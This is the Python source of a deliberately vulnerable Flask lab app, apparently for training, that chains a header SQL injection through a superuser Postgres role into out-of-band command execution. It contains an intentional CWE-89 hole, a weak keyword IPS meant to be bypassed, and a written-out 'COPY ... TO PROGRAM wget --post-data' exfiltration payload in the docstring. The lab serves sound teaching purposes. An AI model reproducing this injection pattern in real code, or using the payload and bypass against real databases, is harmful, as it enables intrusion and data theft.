# SPDX-License-Identifier: MIT
"""Acme EMS — a device-management endpoint with a header SQL injection that
chains through a superuser Postgres role into out-of-band RCE.

Chain (abstracting the shape of CVE-2023-48788, FortiClient EMS):

1. POST /device/register stamps `X-FCTUID` verbatim into an INSERT and runs it
   through psycopg2 .execute() (simple query protocol -> STACKED statements
   allowed). A naive keyword IPS blocks the request if the header (or query
   string) contains SQL keywords — SELECT, UNION, FROM, INFORMATION_SCHEMA,
   OR '1'='1', SLEEP( — as an over-fitted "IPS" a real appliance ships in
   defaults. The intended payload uses a TABLE-source COPY (no SELECT), so it
   sails through.

2. The DB role emsapp is a Postgres superuser. Stacked into the INSERT:
       COPY audit_log TO PROGRAM 'wget -q -O- --post-data=... http://oob:9000/x'
   runs `wget` on the postgres OS user and phones the recovered flag home to
   the OOB collector sidecar. The `backend` network is `internal: true`, so
   the ONLY reachable listener is that in-lab collector.

3. GET /oob/received reads what the collector captured (an app-side proxy —
   the collector itself is not reachable from outside the lab), and the
   learner POSTs the recovered flag to /solve.
"""
import base64
import json
import os
import re
import urllib.request

import psycopg2
from flask import Flask, Response, request

FLAG_PATH = os.environ.get("FLAG_PATH", "/var/lib/lab/flag.txt")

DB = {
    "host": os.environ.get("DB_HOST", "db"),
    "port": int(os.environ.get("DB_PORT", "5432")),
    "dbname": os.environ.get("DB_NAME", "ems"),
    "user": os.environ.get("DB_USER", "emsapp"),
    "password": os.environ.get("DB_PASSWORD", ""),
}
OOB_HOST = os.environ.get("OOB_HOST", "oob")
OOB_PORT = int(os.environ.get("OOB_PORT", "9000"))

# Naive keyword-based IPS: the sort of over-fitted signature list an enterprise
# appliance ships out of the box. It matches on the DECODED request value and
# will trip on SELECT/UNION/FROM/etc. — but does NOT normalise inline comments,
# does NOT model SQL grammar, and does NOT know that COPY <table> TO PROGRAM
# needs no SELECT at all. That is the intended bypass.
_IPS_RULES = [
    ("SELECT",            re.compile(r"\bselect\b", re.I)),
    ("UNION SELECT",      re.compile(r"\bunion\s+select\b", re.I)),
    ("FROM keyword",      re.compile(r"\bfrom\b", re.I)),
    ("INFORMATION_SCHEMA", re.compile(r"\binformation_schema\b", re.I)),
    ("SLEEP()",           re.compile(r"\bsleep\s*\(", re.I)),
    ("classic OR n=n",    re.compile(r"\bor\b\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+", re.I)),
    ("classic OR 'a'='a'", re.compile(r"\bor\b\s+['\"][^'\"]+['\"]\s*=\s*['\"][^'\"]+['\"]", re.I)),
]


def connect() -> psycopg2.extensions.connection:
    conn = psycopg2.connect(connect_timeout=5, **DB)
    conn.autocommit = True
    return conn


def ips_block(value: str) -> tuple[str, str] | None:
    for name, pat in _IPS_RULES:
        if pat.search(value):
            return (name, pat.pattern)
    return None


app = Flask(__name__)


@app.get("/health")
def health() -> Response:
    return Response("ok", mimetype="text/plain")


@app.get("/")
def index() -> Response:
    return Response(
        "Acme EMS device manager.\n"
        "POST /device/register              record a device (headers: X-FCTUID: <uid>)\n"
        "GET  /devices                       list registered devices\n"
        "GET  /oob/received                  proxy to the in-lab OOB collector\n"
        "POST /solve {flag}                  submit the recovered flag\n",
        mimetype="text/plain",
    )


@app.post("/device/register")
def register() -> Response:
    """Record a device registration. VULNERABILITY (CWE-89): the X-FCTUID header
    is concatenated into an INSERT run with psycopg2 .execute() (simple query
    protocol, stacked statements allowed). A naive keyword IPS runs first."""
    fctuid = request.headers.get("X-FCTUID", "")
    hit = ips_block(fctuid)
    if hit is not None:
        return Response(
            json.dumps({"ok": False, "blocked_by": "acme-ips", "rule": hit[0]}),
            mimetype="application/json", status=403,
        )
    hostname = request.headers.get("X-FCT-Host", "unknown")
    sql = (
        "INSERT INTO devices (fctuid, hostname, registered_at) VALUES ('"
        + fctuid + "', '" + hostname + "', now())"
    )
    conn = None
    try:
        conn = connect()
        with conn.cursor() as cur:
            cur.execute(sql)
    except Exception as e:  # noqa: BLE001 -- surface DB error (helpful early)
        return Response(json.dumps({"ok": False, "error": str(e)}),
                        mimetype="application/json", status=200)
    finally:
        if conn is not None:
            conn.close()
    return Response(json.dumps({"ok": True}), mimetype="application/json")


@app.get("/devices")
def devices() -> Response:
    """Parameterised list — NOT injectable; here just so learners can confirm the
    schema when planning the stacked injection."""
    conn = connect()
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT id, fctuid, hostname FROM devices ORDER BY id")
            rows = [{"id": r[0], "fctuid": r[1], "hostname": r[2]} for r in cur.fetchall()]
    finally:
        conn.close()
    return Response(json.dumps({"ok": True, "rows": rows}), mimetype="application/json")


@app.get("/oob/received")
def oob_received() -> Response:
    """Proxy to the in-lab collector. The collector is only reachable from the
    `backend` network; this endpoint is the learner's window into it."""
    try:
        with urllib.request.urlopen(f"http://{OOB_HOST}:{OOB_PORT}/received", timeout=5) as resp:
            body = resp.read()
    except Exception as e:  # noqa: BLE001
        return Response(json.dumps({"ok": False, "error": str(e)}),
                        mimetype="application/json", status=502)
    return Response(body, mimetype="application/json")


@app.post("/solve")
def solve() -> Response:
    body = request.get_json(silent=True) or {}
    submitted = str(body.get("flag", "")).strip()
    try:
        with open(FLAG_PATH, encoding="utf-8") as fh:
            expected = fh.read().strip()
    except OSError:
        return Response(json.dumps({"ok": False, "error": "flag unavailable"}),
                        mimetype="application/json", status=500)
    if submitted and submitted == expected:
        return Response(json.dumps({"ok": True, "flag": expected}),
                        mimetype="application/json")
    return Response(json.dumps({"ok": False, "error": "incorrect flag"}),
                    mimetype="application/json", status=403)
